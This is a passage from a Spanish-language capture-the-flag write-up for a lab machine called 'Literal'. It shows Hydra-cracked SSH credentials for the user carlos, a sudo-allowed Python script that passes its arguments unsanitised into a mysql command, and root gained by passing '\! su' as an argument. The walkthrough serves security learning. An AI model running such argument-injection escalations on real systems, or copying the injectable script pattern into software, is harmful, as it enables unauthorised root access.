[</span><span class="ve">22</span><span class="p">][</span><span class="ve">ssh</span><span class="p">] host: </span><span class="ve">192.168.100.87</span><span class="p">   login: </span><span class="ve">carlos</span><span class="p">   password: </span><span class="ve">ssh100889</span><span class="p">
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished</span>
</code></pre></div></div><br>

<p class="plain-text">Simplemente nos conectamos por <code class="language-plaintext highlighter-rouge">ssh</code> y obtenemos la primera <code class="language-plaintext highlighter-rouge">flag</code> de la máquina</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ ssh </span><span class="p">carlos@192.168.100.87
carlos@192.168.100.87's password: ssh100889
</span><span class="ve">carlos@literal</span><span class="p">:</span><span class="az">~</span><span class="p">$ id
uid=1000(carlos) gid=1000(carlos) groups=1000(carlos)  
</span><span class="ve">carlos@literal</span><span class="p">:</span><span class="az">~</span><span class="p">$ hostname -I
192.168.100.87
</span><span class="ve">carlos@literal</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat user.txt
6d3**************************222
</span><span class="ve">carlos@literal</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

</section>

<section class="post" id="shell-root">
<br><h3 class="post-title">Shell - root</h3><br>

<p class="plain-text">Si miramos privilegios a nivel de <code class="language-plaintext highlighter-rouge">sudoers</code>, podemos ejecutar como <code class="language-plaintext highlighter-rouge">root</code> un script en <code class="language-plaintext highlighter-rouge">python</code> con cualquier <code class="language-plaintext highlighter-rouge">argumento</code>, tenemos capacidad de <code class="language-plaintext highlighter-rouge">lectura</code> sobre script</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">carlos@literal</span><span class="p">:</span><span class="az">~</span><span class="p">$ sudo -l
Matching Defaults entries for carlos on literal:
    secure_path=/usr/local/bin\:/usr/sbin\:/usr/bin\:/bin\:/snap/bin  

User carlos may run the following commands on literal:
    (root) NOPASSWD: /opt/my_things/blog/update_project_status.py *
</span><span class="ve">carlos@literal</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">carlos@literal</span><span class="p">:</span><span class="az">~</span><span class="p">$ cat /opt/my_things/blog/update_project_status.py
#!/usr/bin/python3

# Learning python3 to update my project status
## (mental note: This is important, so administrator is my safe to avoid upgrading records by mistake) :P

'''
References:
* MySQL commands in Linux: https://www.shellhacks.com/mysql-run-query-bash-script-linux-command-line/
* Shell commands in Python: https://stackabuse.com/executing-shell-commands-with-python/
* Functions: https://www.tutorialspoint.com/python3/python_functions.htm
* Arguments: https://www.knowledgehut.com/blog/programming/sys-argv-python-examples
* Array validation: https://stackoverflow.com/questions/7571635/fastest-way-to-check-if-a-value-exists-in-a-list
* Valid if root is running the script: https://stackoverflow.com/questions/2806897/what-is-the-best-way-for-checking-if-the-user-of-a-script-has-root-like-privileg
'''

import os
import sys
from datetime import date

# Functions ------------------------------------------------.
def execute_query(sql):
    os.system("mysql -u " + db_user + " -D " + db_name + " -e \"" + sql + "\"")

# Query all rows
def query_all():
    sql = "SELECT * FROM projects;"
    execute_query(sql)

# Query row by ID
def query_by_id(arg_project_id):
    sql = "SELECT * FROM projects WHERE proid = " + arg_project_id + ";"
    execute_query(sql)

# Update database
def update_status(enddate, arg_project_id, arg_project_status):
    if enddate != 0:
        sql = f"UPDATE projects SET prodateend = '" + str(enddate) + "', prostatus = '" + arg_project_status + "' WHERE proid = '" + arg_project_id + "';"
    else:
        sql = f"UPDATE projects SET prodateend = '2222-12-12', prostatus = '" + arg_project_status + "' WHERE proid = '" + arg_project_id + "';"

    execute_query(sql)

# Main program
def main():
    # Fast validation
    try:
        arg_project_id = sys.argv[1]
    except:
        arg_project_id = ""

    try:
        arg_project_status = sys.argv[2]
    except:
        arg_project_status = ""

    if arg_project_id and arg_project_status: # To update
        # Avoid update by error
        if os.geteuid() == 0:
            array_status = ["Done", "Doing", "To do"]
            if arg_project_status in array_status:
                print("[+] Before update project (" + arg_project_id + ")\n")
                query_by_id(arg_project_id)

                if arg_project_status == 'Done':
                    update_status(date.today(), arg_project_id, arg_project_status)
                else:
                    update_status(0, arg_project_id, arg_project_status)
            else:
                print("Bro, avoid a fail: Done - Doing - To do")
                exit(1)

            print("\n[+] New status of project (" + arg_project_id + ")\n")
            query_by_id(arg_project_id)
        else:
            print("Ejejeeey, avoid mistakes!")
            exit(1)

    elif arg_project_id:
        query_by_id(arg_project_id)
    else:
        query_all()

# Variables ------------------------------------------------.
db_user = "carlos"
db_name = "blog"

# Main program
main()
</span><span class="ve">carlos@literal</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">El funcionamiento del programa es relativamente sencillo, al ejecutarlo sin ningun <code class="language-plaintext highlighter-rouge">argumento</code> simplemente nos lista todas las <code class="language-plaintext highlighter-rouge">columnas</code> de la tabla <code class="language-plaintext highlighter-rouge">projects</code></code>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">carlos@literal</span><span class="p">:</span><span class="az">~</span><span class="p">$ sudo /opt/my_things/blog/update_project_status.py
+-------+--------------------------------------------------------------+---------------------+------------+-----------+
| proid | proname                                                      | prodatecreated      | prodateend | prostatus |
+-------+--------------------------------------------------------------+---------------------+------------+-----------+
|     1 | Ascii Art Python - ABCdario with colors                      | 2021-09-20 17:51:59 | 2021-09-20 | Done      |
|     2 | Ascii Art Python - Show logos only with letter A             | 2021-09-20 18:06:22 | 2222-12-12 | To do     |
|     3 | Ascii Art Bash - Show musical stores (WTF)                   | 2021-09-20 18:06:50 | 2222-12-12 | To do     |
|     4 | Forum - Add that people can send me bug reports of projects  | 2023-04-07 17:40:41 | 2023-11-01 | Doing     |
|     5 | Validate syntax errors on blog pages                         | 2021-09-20 18:07:43 | 2222-12-12 | Doing     |
|     6 | Script to extract info from files and upload it to any DB    | 2021-09-20 18:07:58 | 2222-12-12 | Doing     |
|     7 | Forum - Implement forum form                                 | 2023-04-07 17:46:38 | 2023-11-01 | Doing     |
|     8 | Add that people can create their own projects on DB          | 2021-09-20 18:49:52 | 2222-12-12 | To do     |
|     9 | Ascii Art C - Start learning Ascii Art with C                | 2021-09-20 18:50:02 | 2222-12-12 | To do     |
|    10 | Ascii Art Bash - Welcome banner preview in blog home         | 2021-09-20 18:50:08 | 2222-12-12 | To do     |
|    11 | Blog - Create login and register form                        | 2023-04-07 17:40:28 | 2023-08-21 | Done      |
|    12 | Blog - Improve the appearance of the dashboard/projects page | 2021-09-20 18:50:18 | 2222-12-12 | Doing     |
+-------+--------------------------------------------------------------+---------------------+------------+-----------+  
</span><span class="ve">carlos@literal</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Lo que hace con el <code class="language-plaintext highlighter-rouge">primer</code> argumento es listar todas las <code class="language-plaintext highlighter-rouge">columnas</code> de la tabla <code class="language-plaintext highlighter-rouge">projects</code> pero donde el <code class="language-plaintext highlighter-rouge">proid</code> sea igual al <code class="language-plaintext highlighter-rouge">argumento</code> que en este caso es <code class="language-plaintext highlighter-rouge">1</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">carlos@literal</span><span class="p">:</span><span class="az">~</span><span class="p">$ sudo /opt/my_things/blog/update_project_status.py 1
+-------+-----------------------------------------+---------------------+------------+-----------+
| proid | proname                                 | prodatecreated      | prodateend | prostatus |
+-------+-----------------------------------------+---------------------+------------+-----------+
|     1 | Ascii Art Python - ABCdario with colors | 2023-05-05 05:04:56 | 2023-05-05 | Done      |
+-------+-----------------------------------------+---------------------+------------+-----------+  
</span><span class="ve">carlos@literal</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">El <code class="language-plaintext highlighter-rouge">segundo</code> argumento actualiza el valor <code class="language-plaintext highlighter-rouge">prostatus</code> del <code class="language-plaintext highlighter-rouge">proid</code> seleccionado en el primer argumento a cualquiera de los siguientes valores, <code class="language-plaintext highlighter-rouge">Done</code>, <code class="language-plaintext highlighter-rouge">Doing</code> y <code class="language-plaintext highlighter-rouge">To do</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">carlos@literal</span><span class="p">:</span><span class="az">~</span><span class="p">$ sudo /opt/my_things/blog/update_project_status.py 1 "To do"
[+] Before update project (1)

+-------+-----------------------------------------+---------------------+------------+-----------+
| proid | proname                                 | prodatecreated      | prodateend | prostatus |
+-------+-----------------------------------------+---------------------+------------+-----------+
|     1 | Ascii Art Python - ABCdario with colors | 2023-05-05 05:05:28 | 2023-05-05 | Done      |
+-------+-----------------------------------------+---------------------+------------+-----------+

[+] New status of project (1)

+-------+-----------------------------------------+---------------------+------------+-----------+
| proid | proname                                 | prodatecreated      | prodateend | prostatus |
+-------+-----------------------------------------+---------------------+------------+-----------+
|     1 | Ascii Art Python - ABCdario with colors | 2023-05-05 05:05:42 | 2222-12-12 | To do     |
+-------+-----------------------------------------+---------------------+------------+-----------+  
</span><span class="ve">carlos@literal</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">La vulnerabilidad salta a la vista, el primer <code class="language-plaintext highlighter-rouge">argumento</code> se guarda en <code class="language-plaintext highlighter-rouge">arg_project_id</code> que se ejecuta en una <code class="language-plaintext highlighter-rouge">query sql</code> sin mas, en pocas palabras ejecutaria algo asi</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">def </span><span class="na">main</span><span class="p">():
</span><span class="c1">    # Fast validation
    </span><span class="o">try</span><span class="p">:
        arg_project_id </span><span class="o">= </span><span class="p">sys.argv[</span><span class="mi">1</span><span class="p">]
    </span><span class="o">except</span><span class="p">:
        arg_project_id </span><span class="o">= </span><span class="s">""</span><span class="p">


</span><span class="o">def </span><span class="na">query_by_id</span><span class="p">(</span><span class="am">arg_project_id</span><span class="p">):
    sql </span><span class="o">= </span><span class="s">"SELECT * FROM projects WHERE proid = " </span><span class="o">+ </span><span class="p">arg_project_id </span><span class="o">+ </span><span class="s">";"  
</span><span class="p">    execute_query(sql)</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">SELECT </span><span class="p">* </span><span class="o">FROM </span><span class="p">projects </span><span class="o">WHERE </span><span class="p">proid </span><span class="o">= </span><span class="p">sys.argv[</span><span class="mi">1</span><span class="p">];  </span>
</code></pre></div></div><br>

<p class="plain-text">En la ayuda de <code class="language-plaintext highlighter-rouge">mysql</code>, podemos ver que hay un parametro para ejecutar <code class="language-plaintext highlighter-rouge">comandos</code> el cual es <code class="language-plaintext highlighter-rouge">\!</code> podemos ejecutar un simple <code class="language-plaintext highlighter-rouge">id</code> para comprobarlo, lo ejecuta <code class="language-plaintext highlighter-rouge">carlos</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">carlos@literal</span><span class="p">:</span><span class="az">~</span><span class="p">$ mysql
</span><span class="p">mysql> \h

For information about MySQL products and services, visit:
   http://www.mysql.com/
For developer information, including the MySQL Reference Manual, visit:
   http://dev.mysql.com/
To buy MySQL Enterprise support, training, or other products, visit:
   https://shop.mysql.com/

List of all MySQL commands:
Note that all text commands must be first on line and end with ';'
?         (\?) Synonym for `help'.
clear     (\c) Clear the current input statement.
connect   (\r) Reconnect to the server. Optional arguments are db and host.
delimiter (\d) Set statement delimiter.
edit      (\e) Edit command with $EDITOR.
ego       (\G) Send command to mysql server, display result vertically.
exit      (\q) Exit mysql. Same as quit.
go        (\g) Send command to mysql server.
help      (\h) Display this help.
nopager   (\n) Disable pager, print to stdout.
notee     (\t) Don't write into outfile.
pager     (\P) Set PAGER [to_pager]. Print the query results via PAGER.
print     (\p) Print current command.
prompt    (\R) Change your mysql prompt.
quit      (\q) Quit mysql.
rehash    (\#) Rebuild completion hash.
source    (\.) Execute an SQL script file. Takes a file name as an argument.
status    (\s) Get status information from the server.
system    (\!) Execute a system shell command.
tee       (\T) Set outfile [to_outfile]. Append everything into given outfile.
use       (\u) Use another database. Takes database name as argument.
charset   (\C) Switch to another charset. Might be needed for processing binlog with multi-byte charsets.  
warnings  (\W) Show warnings after every statement.
nowarning (\w) Don't show warnings after every statement.
resetconnection(\x) Clean session context.
query_attributes Sets string parameters (name1 value1 name2 value2 ...) for the next query to pick up.
ssl_session_data_print Serializes the current SSL session data to stdout or file

For server side help, type 'help contents'

</span><span class="p">mysql> \! id;
uid=1000(carlos) gid=1000(carlos) groups=1000(carlos)  
mysql></span>
</code></pre></div></div><br>

<p class="plain-text">Si esta hubiera sido nuestro <code class="language-plaintext highlighter-rouge">argumento</code> en el script la <code class="language-plaintext highlighter-rouge">query</code> que se hubiera ejecutado seria la siguiente, que aunque la sintaxis no es perfecta se <code class="language-plaintext highlighter-rouge">ejecuta</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">mysql> SELECT * FROM projects WHERE proid = \! id;
uid=1000(carlos) gid=1000(carlos) groups=1000(carlos)  
    -></span>
</code></pre></div></div><br>

<p class="plain-text">Podemos comprobarlo, le pasamos <code class="language-plaintext highlighter-rouge">\! id</code> como primer <code class="language-plaintext highlighter-rouge">argumento</code> y ocultamos los errores, como lo ejecutamos con <code class="language-plaintext highlighter-rouge">sudo</code> el output del comando <code class="language-plaintext highlighter-rouge">id</code> es de <code class="language-plaintext highlighter-rouge">root</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">carlos@literal</span><span class="p">:</span><span class="az">~</span><span class="p">$ sudo /opt/my_things/blog/update_project_status.py '\! id' 2>/dev/null  
uid=0(root) gid=0(root) groups=0(root)
</span><span class="ve">carlos@literal</span><span class="p">:</span><span class="az">~</span><span class="p">$</span>
</code></pre></div></div><br>

<p class="plain-text">Simplemente nos queda cambiar el id por <code class="language-plaintext highlighter-rouge">su</code> para convertirnos en root y ver la <code class="language-plaintext highlighter-rouge">flag</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">carlos@literal</span><span class="p">:</span><span class="az">~</span><span class="p">$ sudo /opt/my_things/blog/update_project_status.py '\! su'  
</span><span class="ve">root@literal</span><span class="p">:</span><span class="az">~</span><span class="p"># id
uid=0(root) gid=0(root) groups=0(root)
</span><span class="ve">root@literal</span><span class="p">:</span><span class="az">~</span><span class="p"># hostname -I
192.168.100.87
</span><span class="ve">root@literal</span><span class="p">:</span><span class="az">~</span><span class="p"># cat /root/root.txt
ca4**************************730
</span><span class="ve">root@literal</span><span class="p">:</span><span class="az">~</span><span class="p">#</span>
</code></pre></div></div><br>

</section>

</article>
  </div>
  <footer class="footer">
    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
  </footer><br><br>

<script type="text/javascript" src="/js/jquery.min.js"></script>
<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>

    </div>
  </body>
</html>
